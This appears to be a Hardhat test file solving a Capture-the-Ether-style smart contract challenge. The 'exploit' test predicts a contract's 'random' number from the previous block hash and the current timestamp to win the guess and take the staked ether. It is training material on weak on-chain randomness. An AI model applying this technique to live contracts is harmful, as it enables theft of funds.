import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */

    const blockNumber = await provider.getBlockNumber();
    const block = await provider.getBlock(blockNumber - 1);
    const currentTimestamp = (await provider.getBlock('latest')).timestamp;

    const hashedData = utils.solidityKeccak256(
      ['bytes32', 'uint256'],
      [block.hash, currentTimestamp]
    );

    const answer = ethers.BigNumber.from(hashedData).mod(256);

    const tx = await target.guess(answer, {
      value: utils.parseEther('1'),
    });

    const receipt = await tx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
